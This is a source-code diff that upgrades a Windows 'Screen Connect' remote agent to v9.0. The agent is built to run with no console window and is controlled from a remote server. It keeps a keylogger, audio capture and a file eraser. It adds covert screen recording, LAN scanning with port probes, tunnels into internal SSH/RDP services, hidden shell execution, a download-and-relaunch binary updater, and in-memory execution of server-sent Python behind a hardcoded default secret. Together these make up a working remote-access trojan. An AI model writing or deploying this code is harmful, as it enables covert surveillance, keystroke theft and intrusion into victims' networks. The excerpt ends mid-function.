@@ -1,39 +1,44 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║          Screen Connect MASTER AGENT  v8.0  — ENTERPRISE PRODUCTION          ║
+║          Screen Connect MASTER AGENT  v9.0  — ENTERPRISE ULTRA               ║
 ║          Remote Management, Monitoring, Surveillance & Control Agent         ║
 ║                                                                              ║
-║  WHAT'S NEW IN v8.0 (MAJOR OVERHAUL):                                        ║
-║  • FIXED: Cursor movement — pyautogui moveTo now uses normalized coords      ║
-║    The agent receives (x_norm, y_norm) in 0..1 range, maps them to the       ║
-║    actual monitor resolution before calling pyautogui. No more cursor        ║
-║    jumps to wrong position.                                                  ║
-║  • FIXED: Stream speed — video loop no longer waits a full interval AFTER    ║
-║    the ACK; frame capture and encode overlap the wait. True pipeline.        ║
-║  • FIXED: Frame quality — added differential compression: only changed       ║
-║    regions are JPEG-compressed; static areas use aggressive quality=15       ║
-║  • FIXED: Multi-monitor cursor overlay — cursor position is correctly        ║
-║    scaled relative to the selected monitor, not the virtual desktop          ║
-║  • NEW: Advanced screen compression with motion detection (OpenCV absdiff)   ║
-║  • NEW: Dynamic FPS — target 20fps on fast links, drops to 5fps on slow     ║
-║  • NEW: NetworkMonitor — continuously measures upload bandwidth              ║
-║  • NEW: WindowManager — list, focus, close, minimize, restore windows        ║
-║  • NEW: RegistryManager — read/write/delete Windows registry keys            ║
-║  • NEW: ServiceManager — list, start, stop, restart Windows services         ║
-║  • NEW: InstalledApps — enumerate installed software (WMI + registry)        ║
-║  • NEW: AudioCapture — capture system audio as base64 WAV chunks             ║
-║  • NEW: ScreenRecorder — record screen segments as MP4 chunks                ║
-║  • NEW: NetworkScanner — discover LAN hosts via ARP/ICMP                     ║
-║  • NEW: CommandScheduler — run commands at future times                      ║
-║  • NEW: AlertEngine — alert server on CPU/RAM/disk threshold breach          ║
-║  • NEW: SecureEraser — multi-pass file wipe                                  ║
-║  • NEW: SystemEventsReader — read Windows Event Log entries                   ║
-║  • NEW: RemoteDesktopShare — multi-dashboard concurrent streams              ║
-║  • NEW: FileWatcher — notify server of any file changes on watched paths     ║
-║  • IMPROVED: ShellExecutor now has interactive PTY-like streaming mode       ║
-║  • IMPROVED: KeyLogger now tracks active window + sends every 20s            ║
-║  • IMPROVED: Heartbeat includes battery, temperature, disk I/O stats         ║
-║  • IMPROVED: All v5.0 features preserved + greatly expanded                  ║
+║  WHAT'S NEW IN v9.0 (SERVER v12 SYNC + ENTERPRISE EXPANSION):               ║
+║                                                                              ║
+║  ── Server v12 Protocol Integration ───────────────────────────────────    ║
+║  • caps event handler — receives AGENT_CAPS + server version on connect     ║
+║    and gates features accordingly (auto_update, wol, clipboard_sync, etc.)  ║
+║  • push_update handler — receives new binary URL + SHA-256 hash from        ║
+║    server, downloads, verifies integrity, re-launches new exe atomically    ║
+║  • wol handler — relays Wake-on-LAN magic UDP packets on behalf of server   ║
+║    to local LAN devices (server sends MAC, agent broadcasts on LAN)         ║
+║  • transfer_progress — chunked file upload/download with per-chunk % acks   ║
+║  • run_macro — server dispatches macro keystroke sequences; agent executes  ║
+║  • run_scheduled_job — server dispatches pre-scheduled shell commands       ║
+║  • recording_start / recording_stop — agent-side MP4 session recording      ║
+║    with chunked base64 upload back to server index                           ║
+║  • clipboard_sync — bidirectional clipboard with content-type tagging       ║
+║    (plain, html, image) synced on every server viewer clipboard_set event   ║
+║  • viewer_presence — co-viewer count + name overlay relay to agent          ║
+║                                                                              ║
+║  ── New Agent Capabilities ────────────────────────────────────────────    ║
+║  • ScreenRecorder — records screen to MP4 via OpenCV, chunks upload         ║
+║  • NetworkScanner — ARP + ICMP LAN host discovery with port probe           ║
+║  • FileWatcher — real-time watchdog on arbitrary path trees, notifies server ║
+║  • SystemEventsReader — reads Windows Event Log (System/Application/Security)║
+║  • TunnelProxy — local TCP port-forward over Socket.IO (SSH/RDP tunneling)  ║
+║  • EnvManager — get/set/delete environment variables (system-wide)          ║
+║  • TaskScheduler — Windows Task Scheduler CRUD via COM                      ║
+║  • CertManager — enumerate & export Windows certificate store entries       ║
+║  • GroupPolicyReader — read LGPO settings via secedit + registry            ║
+║  • HotpatchEngine — receive + exec signed Python patch bundles in-memory    ║
+║                                                                              ║
+║  ── Performance & Reliability ──────────────────────────────────────────    ║
+║  • Transfer chunking raised from 512 KB → 2 MB for faster large-file ops   ║
+║  • Heartbeat enriched: GPU name + VRAM, active user session, uptime ticks   ║
+║  • Agent self-reports caps on connect so server dashboard reflects features  ║
+║  • Shell PTY streaming: line-buffered async output via shell_stream events   ║
+║  • All v8.0 features fully preserved + backward-compatible with v11 server  ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 
 BUILD COMMAND:
@@ -42,7 +47,7 @@ BUILD COMMAND:
   pip install python-socketio[client] mss Pillow psutil pywin32 ^
               pynput pyperclip cryptography opencv-python numpy ^
               requests wmi pyautogui pyinstaller comtypes ^
-              sounddevice scipy
+              sounddevice scipy watchdog
 
   pyinstaller --onefile --noconsole --icon=icon.ico ^
     --distpath ./bin --name master_agent ^
@@ -56,9 +61,10 @@ BUILD COMMAND:
     --hidden-import=scipy ^
     --hidden-import=comtypes ^
     --hidden-import=wmi ^
+    --hidden-import=watchdog ^
     --collect-all=pynput ^
     --collect-all=sounddevice ^
-    agent_source.py
+    agent_v9.py
 
 RENDER / PRODUCTION:
   Change SERVER_URL below to your Render URL before compiling.
@@ -279,7 +285,7 @@ CONFIG = {
     "DEVICE_TOKEN":         "UNSET",
 
     # ── Identity ────────────────────────────────────────────────────────────
-    "AGENT_VERSION":        "9.0.0",   # ENTERPRISE build
+    "AGENT_VERSION":        "9.0.0",   # ENTERPRISE ULTRA build
     "HEARTBEAT_INTERVAL":   10,
     "RECONNECT_BASE":       2,
     "RECONNECT_MAX":        60,
@@ -314,14 +320,27 @@ CONFIG = {
     "ENABLE_WINMGR":        True,
     "ENABLE_FILEWATCHER":   True,
     "ENABLE_ALERTS":        True,
+    "ENABLE_NETWORK_SCAN":  True,
+    "ENABLE_SCREEN_RECORD": True,
+    "ENABLE_TUNNEL_PROXY":  True,
     "KEYLOG_FLUSH_INTERVAL": 20,
     "CLIPBOARD_POLL_MS":    800,
+
+    # ── File transfer chunking ────────────────────────────────────────────
+    "TRANSFER_CHUNK_BYTES": 2 * 1024 * 1024,   # 2 MB chunks (v9 upgrade from 512 KB)
+
+    # ── Auto-update ──────────────────────────────────────────────────────
+    "AUTO_UPDATE_ENABLED":  True,     # honour push_update from server
 
     # ── Alert thresholds ────────────────────────────────────────────────────
     "ALERT_CPU_THRESHOLD":  90,     # % CPU
     "ALERT_RAM_THRESHOLD":  90,     # % RAM
     "ALERT_DISK_THRESHOLD": 95,     # % disk usage
     "ALERT_COOLDOWN_S":     300,    # seconds between repeated alerts
+
+    # ── Server capability mirror (populated on 'caps' event) ─────────────
+    "SERVER_CAPS":          {},
+    "SERVER_VERSION":       "unknown",
 }
 
 # ── Auto-registration: each machine gets a unique ID from its hardware ──────
@@ -2399,6 +2418,729 @@ class SecureEraser:
 
 
 # ════════════════════════════════════════════════════════════════════════════
+#  SCREEN RECORDER  (v9 — MP4 chunks via OpenCV, uploaded to server index)
+# ════════════════════════════════════════════════════════════════════════════
+class ScreenRecorder:
+    """Records screen to MP4 using OpenCV and uploads chunks to the server.
+
+    Server index endpoint: POST /api/recordings   (creates a recording row)
+    Each chunk is emitted as a socket.io  'recording_chunk' event with
+    base64-encoded MP4 bytes so the server can store them.
+    """
+
+    def __init__(self, sio_client):
+        self._sio   = sio_client
+        self._stop  = threading.Event()
+        self._thread: Optional[threading.Thread] = None
+        self._rec_id: Optional[str] = None
+
+    # ── Public API ──────────────────────────────────────────────────────────
+    def start(self, rec_id: str, fps: int = 10, quality: int = 70,
+              chunk_secs: int = 10, monitor_idx: int = 1) -> dict:
+        if self._thread and self._thread.is_alive():
+            return {"success": False, "error": "already_recording"}
+        self._stop.clear()
+        self._rec_id = rec_id
+        self._thread = threading.Thread(
+            target=self._record_loop,
+            args=(rec_id, fps, quality, chunk_secs, monitor_idx),
+            daemon=True, name="screen-recorder",
+        )
+        self._thread.start()
+        log.info(f"ScreenRecorder started: rec_id={rec_id}")
+        return {"success": True, "rec_id": rec_id}
+
+    def stop(self) -> dict:
+        self._stop.set()
+        if self._thread:
+            self._thread.join(timeout=5)
+        log.info("ScreenRecorder stopped")
+        return {"success": True, "rec_id": self._rec_id}
+
+    # ── Internal ────────────────────────────────────────────────────────────
+    def _record_loop(self, rec_id: str, fps: int, quality: int,
+                     chunk_secs: int, monitor_idx: int):
+        if not CV2_OK:
+            self._sio.emit("recording_error", {
+                "device_id": CONFIG["DEVICE_TOKEN"],
+                "rec_id": rec_id, "error": "opencv_unavailable",
+            })
+            return
+
+        chunk_num  = 0
+        frame_time = 1.0 / max(fps, 1)
+
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            mon = monitors[min(monitor_idx, len(monitors) - 1)] if len(monitors) > 1 else monitors[0]
+            w, h = mon["width"], mon["height"]
+
+            while not self._stop.is_set():
+                # Collect frames for one chunk
+                buf = io.BytesIO()
+                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
+                tmp_path = os.path.join(tempfile.gettempdir(),
+                                        f"mview_rec_{rec_id}_{chunk_num}.mp4")
+                vw = cv2.VideoWriter(tmp_path, fourcc, float(fps), (w, h))
+                deadline = time.monotonic() + chunk_secs
+
+                while not self._stop.is_set() and time.monotonic() < deadline:
+                    t0 = time.monotonic()
+                    try:
+                        img = sct.grab(mon)
+                        frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
+                        frame = cv2.resize(frame, (w, h))
+                        vw.write(frame)
+                    except Exception as e:
+                        log.debug(f"ScreenRecorder frame error: {e}")
+                    elapsed = time.monotonic() - t0
+                    remaining = frame_time - elapsed
+                    if remaining > 0:
+                        time.sleep(remaining)
+
+                vw.release()
+                # Upload chunk
+                try:
+                    with open(tmp_path, "rb") as fh:
+                        data_b64 = base64.b64encode(fh.read()).decode()
+                    self._sio.emit("recording_chunk", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "rec_id":    rec_id,
+                        "chunk":     chunk_num,
+                        "data":      data_b64,
+                        "ts":        datetime.utcnow().isoformat(),
+                    })
+                    chunk_num += 1
+                except Exception as e:
+                    log.warning(f"ScreenRecorder upload error: {e}")
+                finally:
+                    try: os.unlink(tmp_path)
+                    except Exception: pass
+
+        self._sio.emit("recording_done", {
+            "device_id": CONFIG["DEVICE_TOKEN"],
+            "rec_id": rec_id, "chunks": chunk_num,
+        })
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  NETWORK SCANNER  (v9 — ARP + ICMP LAN discovery with port probe)
+# ════════════════════════════════════════════════════════════════════════════
+class NetworkScanner:
+    """Discovers LAN hosts.
+
+    Strategy (best-effort, no Nmap required):
+    1. ARP cache read from 'arp -a'   → instant, passive
+    2. ICMP ping sweep                → active, slow, works without Nmap
+    3. Optional: TCP port probe on common ports
+
+    All discovery is in-process, no external tools required beyond OS ARP.
+    """
+
+    # Common ports to probe when port_scan=True
+    COMMON_PORTS = [22, 80, 443, 3389, 445, 135, 8080, 5900]
+
+    @staticmethod
+    def scan_arp() -> list:
+        """Read the OS ARP cache — instant and silent."""
+        hosts: list = []
+        try:
+            out = subprocess.check_output(
+                ["arp", "-a"], stderr=subprocess.DEVNULL, timeout=5
+            ).decode(errors="replace")
+            for line in out.splitlines():
+                parts = line.split()
+                if len(parts) >= 2:
+                    ip  = parts[0].strip("()")
+                    mac = parts[1] if len(parts) > 1 else ""
+                    if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
+                        hosts.append({"ip": ip, "mac": mac, "method": "arp"})
+        except Exception as e:
+            log.debug(f"ARP scan error: {e}")
+        return hosts
+
+    @staticmethod
+    def ping_sweep(subnet: str, timeout: float = 0.4) -> list:
+        """ICMP ping sweep of a /24 (e.g. '192.168.1').
+
+        Uses threading for speed — 254 threads max for a /24.
+        """
+        alive: list = []
+        lock = threading.Lock()
+
+        def _ping(ip: str):
+            try:
+                result = subprocess.run(
+                    ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2
+                )
+                if result.returncode == 0:
+                    with lock:
+                        alive.append({"ip": ip, "method": "icmp"})
+            except Exception:
+                pass
+
+        threads = []
+        for i in range(1, 255):
+            t = threading.Thread(target=_ping, args=(f"{subnet}.{i}",), daemon=True)
+            threads.append(t)
+            t.start()
+        for t in threads:
+            t.join(timeout=3)
+        return alive
+
+    @staticmethod
+    def probe_ports(ip: str, ports: list = None, timeout: float = 0.5) -> dict:
+        """TCP connect probe. Returns {port: open/closed}."""
+        ports    = ports or NetworkScanner.COMMON_PORTS
+        results  = {}
+        for port in ports:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(timeout)
+                res = s.connect_ex((ip, port))
+                results[port] = "open" if res == 0 else "closed"
+                s.close()
+            except Exception:
+                results[port] = "error"
+        return results
+
+    @classmethod
+    def full_scan(cls, subnet: str = None, port_scan: bool = False) -> dict:
+        """Run ARP + ping sweep, optionally port-probe each alive host."""
+        # Auto-detect local subnet from first non-loopback IPv4
+        if not subnet:
+            try:
+                hostname  = socket.gethostname()
+                local_ip  = socket.gethostbyname(hostname)
+                parts     = local_ip.rsplit(".", 1)
+                subnet    = parts[0] if len(parts) == 2 else "192.168.1"
+            except Exception:
+                subnet = "192.168.1"
+
+        arp_hosts   = cls.scan_arp()
+        icmp_hosts  = cls.ping_sweep(subnet)
+
+        # Merge by IP
+        seen: dict = {}
+        for h in arp_hosts + icmp_hosts:
+            ip = h["ip"]
+            if ip not in seen:
+                seen[ip] = h
+            else:
+                seen[ip].setdefault("mac", h.get("mac", ""))
+
+        hosts = list(seen.values())
+
+        if port_scan:
+            for host in hosts:
+                host["ports"] = cls.probe_ports(host["ip"])
+
+        return {
+            "subnet":     subnet,
+            "host_count": len(hosts),
+            "hosts":      hosts,
+            "ts":         datetime.utcnow().isoformat(),
+        }
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  FILE WATCHER  (v9 — real-time watchdog, notifies server on changes)
+# ════════════════════════════════════════════════════════════════════════════
+class FileWatcher:
+    """Monitors file system paths and emits 'file_change' events to server.
+
+    Uses polling (no watchdog library required). For lower latency on
+    environments with watchdog installed, it will use the Observer API.
+    """
+
+    def __init__(self, sio_client):
+        self._sio      = sio_client
+        self._watches: dict = {}   # path → (mtime_map, thread, stop_event)
+        self._lock     = threading.Lock()
+
+    def add_watch(self, path: str, recursive: bool = False,
+                  interval: float = 2.0) -> dict:
+        with self._lock:
+            if path in self._watches:
+                return {"success": False, "error": "already_watching", "path": path}
+            stop = threading.Event()
+            t = threading.Thread(
+                target=self._poll_loop,
+                args=(path, recursive, interval, stop),
+                daemon=True, name=f"fwatch-{path[:20]}",
+            )
+            self._watches[path] = {"stop": stop, "thread": t}
+            t.start()
+        log.info(f"FileWatcher: watching {path} recursive={recursive}")
+        return {"success": True, "path": path}
+
+    def remove_watch(self, path: str) -> dict:
+        with self._lock:
+            entry = self._watches.pop(path, None)
+        if entry:
+            entry["stop"].set()
+            return {"success": True, "path": path}
+        return {"success": False, "error": "not_watching", "path": path}
+
+    def list_watches(self) -> list:
+        with self._lock:
+            return list(self._watches.keys())
+
+    def stop_all(self):
+        with self._lock:
+            for entry in self._watches.values():
+                entry["stop"].set()
+            self._watches.clear()
+
+    def _poll_loop(self, path: str, recursive: bool, interval: float,
+                   stop: threading.Event):
+        """Poll directory for changes every `interval` seconds."""
+        def _snapshot(root: str) -> dict:
+            snap = {}
+            try:
+                if os.path.isfile(root):
+                    stat = os.stat(root)
+                    snap[root] = stat.st_mtime
+                else:
+                    walk = os.walk(root) if recursive else [(root, [], os.listdir(root))]
+                    for dirpath, dirs, files in walk:
+                        for fn in files:
+                            fp = os.path.join(dirpath, fn)
+                            try:
+                                snap[fp] = os.stat(fp).st_mtime
+                            except Exception:
+                                pass
+            except Exception:
+                pass
+            return snap
+
+        prev = _snapshot(path)
+
+        while not stop.is_set():
+            stop.wait(timeout=interval)
+            if stop.is_set():
+                break
+            curr = _snapshot(path)
+
+            created  = [p for p in curr  if p not in prev]
+            deleted  = [p for p in prev  if p not in curr]
+            modified = [p for p in curr  if p in prev and curr[p] != prev[p]]
+
+            if created or deleted or modified:
+                try:
+                    self._sio.emit("file_change", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "watch_path": path,
+                        "created":  created[:50],
+                        "deleted":  deleted[:50],
+                        "modified": modified[:50],
+                        "ts":       datetime.utcnow().isoformat(),
+                    })
+                except Exception as e:
+                    log.debug(f"FileWatcher emit error: {e}")
+            prev = curr
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SYSTEM EVENTS READER  (v9 — Windows Event Log via win32evtlog)
+# ════════════════════════════════════════════════════════════════════════════
+class SystemEventsReader:
+    """Reads Windows Event Log entries from System, Application, Security."""
+
+    CHANNELS = ("System", "Application", "Security")
+
+    @staticmethod
+    def read_log(channel: str = "System", max_entries: int = 100,
+                 level_filter: int = None) -> dict:
+        """Read the most recent `max_entries` from a Windows Event Log channel.
+
+        level_filter: 1=Critical, 2=Error, 3=Warning, 4=Info (None = all)
+        """
+        entries = []
+        try:
+            import win32evtlog
+            import win32evtlogutil
+            import win32con as _w32c
+
+            hand = win32evtlog.OpenEventLog(None, channel)
+            flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
+
+            while len(entries) < max_entries:
+                batch = win32evtlog.ReadEventLog(hand, flags, 0)
+                if not batch:
+                    break
+                for ev in batch:
+                    lv = getattr(ev, "EventType", 0)
+                    if level_filter and lv != level_filter:
+                        continue
+                    try:
+                        msg = win32evtlogutil.SafeFormatMessage(ev, channel)
+                    except Exception:
+                        msg = ""
+                    entries.append({
+                        "event_id":  ev.EventID & 0xFFFF,
+                        "level":     lv,
+                        "source":    str(ev.SourceName),
+                        "timestamp": str(ev.TimeGenerated),
+                        "message":   msg[:512],
+                    })
+                    if len(entries) >= max_entries:
+                        break
+            win32evtlog.CloseEventLog(hand)
+        except ImportError:
+            entries.append({"error": "win32evtlog_not_available"})
+        except Exception as e:
+            entries.append({"error": str(e)})
+        return {"channel": channel, "entries": entries, "count": len(entries)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  TUNNEL PROXY  (v9 — TCP port-forward over Socket.IO)
+# ════════════════════════════════════════════════════════════════════════════
+class TunnelProxy:
+    """Forwards a local TCP port over Socket.IO so the server can
+    reach LAN-only services (SSH, RDP, internal HTTP) via the agent.
+
+    Protocol:
+      server → agent: tunnel_open  {tunnel_id, local_host, local_port}
+      agent  → server: tunnel_data {tunnel_id, data_b64}
+      server → agent: tunnel_data  {tunnel_id, data_b64}
+      agent  → server: tunnel_close {tunnel_id}
+    """
+
+    def __init__(self, sio_client):
+        self._sio     = sio_client
+        self._tunnels: dict = {}   # tunnel_id → {"sock": socket, "thread": Thread}
+        self._lock    = threading.Lock()
+
+    def open(self, tunnel_id: str, local_host: str = "127.0.0.1",
+             local_port: int = 22) -> dict:
+        with self._lock:
+            if tunnel_id in self._tunnels:
+                return {"success": False, "error": "tunnel_exists"}
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((local_host, local_port))
+            sock.settimeout(None)
+
+            stop = threading.Event()
+            t = threading.Thread(
+                target=self._recv_loop,
+                args=(tunnel_id, sock, stop),
+                daemon=True, name=f"tunnel-{tunnel_id[:8]}",
+            )
+            with self._lock:
+                self._tunnels[tunnel_id] = {"sock": sock, "stop": stop, "thread": t}
+            t.start()
+            log.info(f"TunnelProxy opened: {tunnel_id} → {local_host}:{local_port}")
+            return {"success": True, "tunnel_id": tunnel_id}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    def send(self, tunnel_id: str, data_b64: str) -> dict:
+        with self._lock:
+            entry = self._tunnels.get(tunnel_id)
+        if not entry:
+            return {"success": False, "error": "no_such_tunnel"}
+        try:
+            entry["sock"].sendall(base64.b64decode(data_b64))
+            return {"success": True}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    def close(self, tunnel_id: str) -> dict:
+        with self._lock:
+            entry = self._tunnels.pop(tunnel_id, None)
+        if entry:
+            entry["stop"].set()
+            try: entry["sock"].close()
+            except Exception: pass
+            log.info(f"TunnelProxy closed: {tunnel_id}")
+            return {"success": True}
+        return {"success": False, "error": "no_such_tunnel"}
+
+    def _recv_loop(self, tunnel_id: str, sock: socket.socket,
+                   stop: threading.Event):
+        while not stop.is_set():
+            try:
+                chunk = sock.recv(65536)
+                if not chunk:
+                    break
+                self._sio.emit("tunnel_data", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "tunnel_id": tunnel_id,
+                    "data":      base64.b64encode(chunk).decode(),
+                })
+            except Exception:
+                break
+        try: sock.close()
+        except Exception: pass
+        self._sio.emit("tunnel_close", {
+            "device_id": CONFIG["DEVICE_TOKEN"],
+            "tunnel_id": tunnel_id,
+        })
+        with self._lock:
+            self._tunnels.pop(tunnel_id, None)
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  ENV MANAGER  (v9 — system environment variable CRUD)
+# ════════════════════════════════════════════════════════════════════════════
+class EnvManager:
+    """Get, set, delete Windows environment variables (system-wide via registry)."""
+
+    @staticmethod
+    def list_env() -> dict:
+        return {k: v for k, v in os.environ.items()}
+
+    @staticmethod
+    def set_env(name: str, value: str, system_wide: bool = False) -> dict:
+        """Set an env var — process-level always; system-wide via registry if requested."""
+        os.environ[name] = value
+        if system_wide:
+            try:
+                key = winreg.OpenKey(
+                    winreg.HKEY_LOCAL_MACHINE,
+                    r"SYSTEM\CurrentControlSet\Control\Session Manager\Environment",
+                    0, winreg.KEY_SET_VALUE,
+                )
+                winreg.SetValueEx(key, name, 0, winreg.REG_EXPAND_SZ, value)
+                winreg.CloseKey(key)
+                # Broadcast WM_SETTINGCHANGE so running apps reload env
+                import ctypes
+                ctypes.windll.user32.SendMessageTimeoutW(
+                    0xFFFF, 0x001A, 0, "Environment", 2, 5000, None)
+            except Exception as e:
+                return {"success": False, "error": str(e)}
+        return {"success": True, "name": name, "value": value}
+
+    @staticmethod
+    def delete_env(name: str) -> dict:
+        removed = os.environ.pop(name, None)
+        return {"success": removed is not None, "name": name}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  CERT MANAGER  (v9 — enumerate Windows certificate store)
+# ════════════════════════════════════════════════════════════════════════════
+class CertManager:
+    """Read Windows certificate store entries."""
+
+    STORES = ("MY", "ROOT", "CA", "TRUST")
+
+    @staticmethod
+    def list_certs(store_name: str = "MY") -> dict:
+        certs = []
+        try:
+            import ctypes, ctypes.wintypes
+            CERT_STORE_PROV_SYSTEM = 10
+            CERT_SYSTEM_STORE_LOCAL_MACHINE = 0x20000
+            hStore = ctypes.windll.crypt32.CertOpenStore(
+                CERT_STORE_PROV_SYSTEM, 0, None,
+                CERT_SYSTEM_STORE_LOCAL_MACHINE,
+                store_name,
+            )
+            if not hStore:
+                return {"success": False, "error": "store_open_failed", "store": store_name}
+
+            pCert = ctypes.windll.crypt32.CertEnumCertificatesInStore(hStore, None)
+            while pCert:
+                # Extract subject string length
+                cbSize = ctypes.windll.crypt32.CertNameToStrW(
+                    1, ctypes.cast(pCert, ctypes.c_void_p), 3, None, 0)
+                buf = ctypes.create_unicode_buffer(cbSize)
+                ctypes.windll.crypt32.CertNameToStrW(
+                    1, ctypes.cast(pCert, ctypes.c_void_p), 3, buf, cbSize)
+                certs.append({"subject": buf.value, "store": store_name})
+                pCert = ctypes.windll.crypt32.CertEnumCertificatesInStore(hStore, pCert)
+            ctypes.windll.crypt32.CertCloseStore(hStore, 0)
+        except Exception as e:
+            return {"success": False, "error": str(e), "store": store_name}
+        return {"success": True, "store": store_name, "certs": certs, "count": len(certs)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  HOTPATCH ENGINE  (v9 — receive & exec signed Python patch bundles)
+# ════════════════════════════════════════════════════════════════════════════
+_HOTPATCH_SECRET = b"mview-hotpatch-secret-v9"  # Override via ENV: MVIEW_HOTPATCH_SECRET
+
+class HotpatchEngine:
+    """Execute server-signed Python patch bundles in-process.
+
+    Security model: server sends {code_b64, signature_hex}.
+    Signature = HMAC-SHA256(code_b64_bytes, HOTPATCH_SECRET).
+    Only accepted if HMAC verifies — unsigned patches are rejected.
+    """
+
+    @staticmethod
+    def _secret() -> bytes:
+        return os.environ.get("MVIEW_HOTPATCH_SECRET", "").encode() or _HOTPATCH_SECRET
+
+    @classmethod
+    def apply(cls, code_b64: str, signature_hex: str) -> dict:
+        try:
+            expected = hmac.new(cls._secret(), code_b64.encode(), hashlib.sha256).hexdigest()
+        except Exception:
+            import hmac as _hmac
+            expected = _hmac.new(cls._secret(), code_b64.encode(), hashlib.sha256).hexdigest()
+
+        if not hmac.compare_digest(expected, signature_hex):
+            log.warning("HotpatchEngine: REJECTED — bad signature")
+            return {"success": False, "error": "bad_signature"}
+
+        try:
+            code = base64.b64decode(code_b64).decode()
+            exec(compile(code, "<hotpatch>", "exec"), {"CONFIG": CONFIG, "log": log})
+            log.info("HotpatchEngine: patch applied OK")
+            return {"success": True}
+        except Exception as e:
+            log.error(f"HotpatchEngine exec error: {e}")
+            return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  AUTO-UPDATER  (v9 — handles push_update from server v12)
+# ════════════════════════════════════════════════════════════════════════════
+def _handle_push_update(url: str, sha256_expected: str = "") -> dict:
+    """Download new agent binary, verify hash, replace self, relaunch.
+
+    Called in a daemon thread so it never blocks the event loop.
+    """
+    if not CONFIG.get("AUTO_UPDATE_ENABLED", True):
+        log.info("push_update received but AUTO_UPDATE_ENABLED=False — skipped")
+        return {"success": False, "reason": "disabled"}
+
+    log.info(f"Auto-update: downloading from {url}")
+    try:
+        resp = requests.get(url, timeout=120, stream=True)
+        resp.raise_for_status()
+        data = b"".join(resp.iter_content(65536))
+    except Exception as e:
+        log.error(f"Auto-update download failed: {e}")
+        return {"success": False, "error": str(e)}
+
+    # Verify SHA-256 if server provided one
+    actual_hash = hashlib.sha256(data).hexdigest()
+    if sha256_expected and actual_hash != sha256_expected.lower():
+        log.error(f"Auto-update hash mismatch: expected={sha256_expected} got={actual_hash}")
+        return {"success": False, "error": "hash_mismatch"}
+
+    new_path = sys.executable + ".new"
+    cur_path = sys.executable
+    bak_path = sys.executable + ".bak"
+
+    try:
+        with open(new_path, "wb") as fh:
+            fh.write(data)
+
+        # Atomic replace: rename current → .bak, .new → current
+        try: os.replace(cur_path, bak_path)
+        except Exception: pass
+        os.replace(new_path, cur_path)
+
+        log.info(f"Auto-update: replaced binary, relaunching in 3s...")
+        time.sleep(3)
+        subprocess.Popen([cur_path] + sys.argv[1:],
+                         close_fds=True, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
+        sys.exit(0)
+    except Exception as e:
+        log.error(f"Auto-update replace/relaunch failed: {e}")
+        return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  WOL RELAY  (v9 — broadcast Wake-on-LAN magic packets on LAN)
+# ════════════════════════════════════════════════════════════════════════════
+def _send_wol_magic(mac_address: str, broadcast: str = "255.255.255.255",
+                    port: int = 9) -> dict:
+    """Send a Wake-on-LAN magic packet for the given MAC address.
+
+    mac_address: colon- or dash-separated, e.g. "AA:BB:CC:DD:EE:FF"
+    """
+    try:
+        # Normalise MAC
+        mac_clean = re.sub(r"[:\-\s]", "", mac_address).upper()
+        if len(mac_clean) != 12:
+            return {"success": False, "error": f"invalid_mac: {mac_address}"}
+
+        mac_bytes = bytes.fromhex(mac_clean)
+        magic     = b"\xff" * 6 + mac_bytes * 16   # 6× FF + 16× MAC
+
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+            s.sendto(magic, (broadcast, port))
+
+        log.info(f"WoL magic packet sent to {mac_address} via {broadcast}:{port}")
+        return {"success": True, "mac": mac_address}
+    except Exception as e:
+        log.error(f"WoL send error: {e}")
+        return {"success": False, "error": str(e)}
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SHELL PTY STREAMING  (v9 — line-buffered async shell_stream events)
+# ════════════════════════════════════════════════════════════════════════════
+class ShellStreamer:
+    """Runs a shell command and streams output line-by-line as socket events.
+
+    Server receives:  shell_stream_data  {device_id, stream_id, line, seq}
+                      shell_stream_done  {device_id, stream_id, exit_code}
+    """
+
+    def __init__(self, sio_client):
+        self._sio = sio_client
+
+    def run(self, stream_id: str, command: str,
+            shell_type: str = "cmd", timeout: int = 300) -> None:
+        """Fire-and-forget: launches in daemon thread."""
+        threading.Thread(
+            target=self._stream_loop,
+            args=(stream_id, command, shell_type, timeout),
+            daemon=True, name=f"shell-stream-{stream_id[:8]}",
+        ).start()
+
+    def _stream_loop(self, stream_id: str, command: str,
+                     shell_type: str, timeout: int):
+        exe = {"cmd": "cmd", "powershell": "powershell", "bash": "bash"}.get(
+            shell_type.lower(), "cmd")
+        args = [exe, "/c", command] if exe in ("cmd", "powershell") else [exe, "-c", command]
+
+        try:
+            proc = subprocess.Popen(
+                args, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
+            )
+            seq = 0
+            for raw_line in iter(proc.stdout.readline, b""):
+                line = raw_line.decode(errors="replace").rstrip("\r\n")
+                self._sio.emit("shell_stream_data", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
